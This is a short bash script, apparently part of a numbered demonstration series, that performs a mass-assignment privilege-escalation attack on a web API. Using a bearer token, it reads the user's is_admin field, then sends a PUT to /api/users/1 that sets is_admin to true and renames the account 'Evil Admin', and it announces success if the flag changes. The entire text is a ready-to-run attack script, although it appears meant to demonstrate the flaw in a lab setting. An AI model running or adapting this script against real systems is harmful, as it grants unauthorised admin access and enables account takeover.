#!/bin/bash
# Mass Assignment Attack - Attempt privilege escalation
# Usage: First run 01-login.sh to get TOKEN, then run this script

source "$(dirname "$0")/00-vars.sh"

if [ -z "$TOKEN" ]; then
    echo "Error: TOKEN not set. Run ./01-login.sh first or export TOKEN manually."
    exit 1
fi

echo "=== Mass Assignment Attack: Privilege Escalation ==="
echo ""

# Get current user info
echo "Current user info:"
curl -s -X GET "$API_URL/api/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" | jq '.is_admin'

echo ""
echo "Attempting to escalate privileges by setting is_admin=true..."
echo ""

# Attempt mass assignment attack
RESPONSE=$(curl -s -X PUT "$API_URL/api/users/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"is_admin":true,"name":"Evil Admin"}')

echo "Response:"
echo "$RESPONSE" | jq .

echo ""
IS_ADMIN=$(echo "$RESPONSE" | jq -r '.is_admin')
if [ "$IS_ADMIN" = "true" ]; then
    echo "!!! ATTACK SUCCESSFUL! You are now an admin !!!"
    echo "This demonstrates the mass-assignment vulnerability."
else
    echo "Attack blocked. The vulnerability may be patched."
fi
